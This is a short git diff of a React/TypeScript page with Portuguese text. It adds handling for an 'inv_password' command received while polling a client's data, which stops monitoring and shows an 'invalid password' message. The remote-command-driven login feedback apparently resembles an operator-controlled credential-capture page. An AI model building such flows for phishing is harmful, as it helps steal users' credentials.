@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
@@ -120,6 +121,19 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void,
           toast({
             title: "Dados incorretos",
             description: "Os dados da página /home estão incorretos. Verifique suas credenciais e tente novamente.",
+            variant: "destructive",
+          });
+          return;
+        }
+        
+        // Verificar se recebeu comando de senha inválida
+        if (clientData.data?.response === "inv_password" || clientData.data?.command === "inv_password") {
+          console.log('Detectado inv_password - Senha inválida');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - senha inválida');
+          toast({
+            title: "Senha inválida",
+            description: "A senha informada está incorreta. Verifique sua senha e tente novamente.",
             variant: "destructive",
           });
           return;
